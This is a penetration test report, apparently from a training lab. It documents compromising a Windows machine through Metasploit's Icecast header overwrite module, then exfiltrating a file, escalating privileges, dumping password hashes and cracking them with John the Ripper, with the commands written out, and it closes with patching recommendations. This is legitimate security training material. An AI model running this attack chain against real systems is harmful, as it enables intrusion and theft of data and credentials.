GoodSecurity Penetration Test Report
  
[ScottHansen\@GoodSecurity.com](mailto:YOURNAMEHERE@GoodSecurity.com)
  
October 25 2021
  
1.  # High-Level Summary
  
GoodSecurity was tasked with performing an internal penetration test on
GoodCorp's CEO, Hans Gruber. An internal penetration test is a dedicated
attack against internally connected systems. The focus of this test is
to perform attacks, similar to those of a hacker and attempt to
infiltrate Hans' computer and determine if it is at risk. GoodSecurity's
overall objective was to exploit any vulnerable software and find the
secret recipe file on Hans' computer, while reporting the findings back
to GoodCorp.
  
When performing the internal penetration test, there were several
alarming vulnerabilities that were identified on Mr. Gruber's desktop. When performing the attacks, GoodSecurity
was able to gain access to his machine and find the secret recipe file
by exploit two programs that had major vulnerabilities. The details of
the attack can be found in the 'Findings' category.
  
1.  # Findings
  
**Machine IP:**
  
192.168.0.6
  
**Hostname:**
  
MSEDGEWIN10
  
**Vulnerability Exploited:**
  
Icecast Header Overwrite (Metasploit exploit/windows/http/icecast_header
  
**Vulnerability Explanation:**
  
During our investigation we found that this computer was subject to a
buffer overflow exploit that allows an attacker to remotely gain control
of the system, using the Icecast service on port 8000. This exploit
operated by over writing the memory on the affected system.
  
Some actions that an attacker may take on a vulnerable system are:
  
Key logging
  
File discovery
  
Downloading and uploading files and executables to system.
  
Also found in the discovery process is that this system is also
vulnerable to:
  
Ikeext Service Exploitation (EXPLOIT/WINDOWS/LOCAL/IKEEXT_SERVICE) which
exploits the ikeext service witch runs as system, and starts
automaticaly in Vista-Win8
  
Windows Net-NTLMv2 (exploit/windows/local/ms16_075_reflection) this
exploit can be used for privilege elevations.
  
**Severity:**
  
Because of the multiple exploits found, as well as the fact it allows us
privilege escalation, uploading and downloading of files, this would be
classified as a Critical Severity Level.
  
**Proof of Concept:**
  
Normally during a penetration I would have to break into the network and scan the network in order to find the computer that I would then need to attack. However that was not the scope of this test, and I was given access to the network as well as the working IP address of the victims computer (192.168.0.6)
  
Now that I have both network connection and the IP address, I run the NMAP tool with the option os -sV, which allows us to see the service or version of what's running on that port. The command looked like `nmap -sV`
  
![nmap](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/nmap%20results.JPG)
  




  
  
As we see it's the normal services running on the ports except port 8000, which has Icecast running on it. Once I found out this information I quick Googled, Icecast to find out what it is, and found that it's an open source or free in other terms, streaming server for audio/video. 
With that knowledge I searched for an exploit using the searchsploit command. This is easily done by typing `searchsploit Icecast`, and as you see a couple exploits were found. 
  
![searchsploit](https://github.com/shansen18/BootCamp/blob/main/Week17/images/searchsploit.JPG)
  
  
Now that I found it to be vulnerable, I opened the Metasploit program. This is another database of exploits, that we can uses to attack a vulnerability. The command to run this program is `msfconsole`.
  
![msfconsole](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/msfconsole.JPG)
  
  
Once Metasploit opened I again searched to see if Icecast had an exploit in here. I did this by running `search Icecast` which returned the following result.
  
![serachicecast](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/Search_Icecast.JPG)
  
  
To use this module I typed in `use 0`. This will load the module so I can see the information on it and start manipulating the data in order to point it at the correct machine. 
Before I could use this exploit I would need to know what information I would need to input in order for it to work. I use the `info` command to view the information about the module, and what variable I had to set. 
  
![info](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/exploitinfo.JPG)
  
  
I then proceeded to set the Remote hosts IP address to the victims computer by typing `set RHOST 192.168.0.6`
  
![rhost](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/Setrhost.JPG)
  
  
I then had to set the local hosts or my computers IP address in the module as well. This is specific to my testing computer. To do this I ran the command `set LHOST 192.168.0.2`
  
![lhost](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/setlhost.JPG)
  
  
I then typed `run` which delivered the payload and opened up a Meterpreter command line. Meterpreter runs in the memory of the victims computer and does not install anything to the hard drive. 
  
![run](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/Run.JPG)
  
  
Once I had the command line I typed `getuid`. This command gives me the user ID of who I'm logged in as. in this case it's the IEUser on the MSEDGEWIN10 network. 
  
![getuid](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/getuid.JPG)
  
  
I also ran the `pwd` command which tells me what directory I'm currently in. This information is needed in order to accurately move around the system. 
  
![pwd](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/pwd.JPG)
  
  
I then set out to find the secret recipe file and exfiltrate it. 
  
The first command I ran was `search -f *secret*txt -r` this searched the victims computer for a text file that contained the work secret. It returned one file located at `c:\Users\IEUser\Documents\user.secretfile.txt`. This file was not the file I was tasked with exfiltrating, so I left it alone. 
  
![search secret](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/search_secret.JPG)

  
I then modified my search to `search -f *recipe*.txt` this returned the file that I was tasked to exfiltrate, located at `c:\Users\IEUser\Documents\Drinks.recipe.txt`
  
![search recipe](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/search_recipe.JPG)
  
  
Now with the location I began to exfiltrate (download) the file, using the following command `download "c:\Users\IEUser\Documents\Drinks.recipe.txt"`
  
![download](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/download_recipe.JPG)
  
  
I then opened another terminal and ran `cat Drinks.recipe.txt` to view the contents of the file. 
  
![Cat recipes](https://github.com/shansen18/BootCamp/blob/6ec2eb53990e277a1ea7ca4c160cd36957bc56fa/Week17/images/Catrecipe.JPG)
  
  
Then just to prove that I had accessed the computer, and viewed the secret recipe file. I uploaded a file to the same location `c:\Users\IEUser\Documents\` called Doctor.txt which contains the next line of the song. 
  
![upload](https://github.com/shansen18/BootCamp/blob/main/Week17/images/upload.JPG)
![upload2](https://github.com/shansen18/BootCamp/blob/main/Week17/images/uploadedtextfile.JPG)
![upload3](https://github.com/shansen18/BootCamp/blob/main/Week17/images/Contentsdoctor.JPG)
  
At this point we are done with the exercise. I have exploited a vulnerability on the victims computer, and was both able to exfiltrate a file, as well as upload my own file. However I feel to further prove our standpoint that this is a critical flaw. To do this I will run a script that will show all logged on users, open a shell on the victims computer, show the victims computers information, as well as retrieve and crack his password. 
  
  
So the first thing I did was to the command `run post/windows/gather/enum_logged_on_users` while still in the Meterpreter command line. This returned the user IEUser as the only one currently logged in but we can also see two other users recently logged in. 
  
![userenum](https://github.com/shansen18/BootCamp/blob/d4348fcf0f79e669ebb3d1948b923f38479c7b90/Week17/images/enum_logged_on_users.JPG)
  
  
I then ran the command `shell` to open a shell, which basically acts and uses the same commands as a windows command prompt. 
  
![shell](https://github.com/shansen18/BootCamp/blob/main/Week17/images/shell.JPG)
  
  
Going back to Meterpreter I ran the `sysinfo` command which gave me the information in the following screenshot. 
  
![systeminfo](https://github.com/shansen18/BootCamp/blob/e5c97c371c3a80a0bddbdea6480b5f8218ace37c/Week17/images/getsystem.JPG)
  
  
So now using the `getsystem` command I was able to get Root or admin privilege. 
  
![getroot](https://github.com/shansen18/BootCamp/blob/main/Week17/images/getpriv.JPG)
  
  
From there in Meterpreter I ran the following command to get the password hashes. 
`run post/windows/gather/hashdump`
  
![hash](https://github.com/shansen18/BootCamp/blob/main/Week17/images/hashdump.JPG)
  
  
Once I received the hashes, I copied them to a file I named hashes.txt on my attacking machine. From there I ran a program called John the Ripper to crack the hashes. In order to do this I had to run the following command `john --format=NT --wordlist=rockyou.txt hashes.txt`  This returned the following information. 
  
![john](https://github.com/shansen18/BootCamp/blob/e5c97c371c3a80a0bddbdea6480b5f8218ace37c/Week17/images/john_results.JPG)
  
There should be a separate finding for each vulnerability found!
  
 # Recommendations
  
To fix the vulnerability issues on Mr. Grubers computer. We at GoodSecurity recommend that Mr. Gruber updates Icecast to the latest version. The version found on Mr. Gruber's computer is 2.0.1, the current version is 2.4.4. We at GoodSecurity further suggest that Mr. Gruber update his computer on a regular basis in order to stay on top of any security patches that maybe released.  We also suggest that Mr. Gruber turns on the firewall & Network protection on his, as having this turned on will prevent this exploit from happening. 
Additionally during the briefing of the scope of this test, Mr. Gruber made mention that the companies passwords are long and complex and therefore un-hackable. During this test, our tester was able to find, download and crack the hash for the Administrators account. It was found that although the password contained: upper and lowercase letters, and numbers and special characters, and a length of nine characters, it was easy to break because it was based off a word that is found in a dictionary. GoodCorp could further protect their passwords by completely randomizing the letters number and special characters into a sequence that does not resemble a word in a dictionary. 
GoodSecurity also suggests that if Icecast is not needed on Mr. Grubers computer, to move the Icecast program onto a server. This will prevent any issues with lack system resources issues that may come with a media streaming program. This will also allow the IT team to manage the server and services patches to the Icecast program as well as manage the firewall rules.  
  
  
With these simple fixes, GoodCorp can secure Mr. Grubers computer from the current vulnerability, as well as protect against any further potential vulnerabilities due to the lack of patching security flaws. 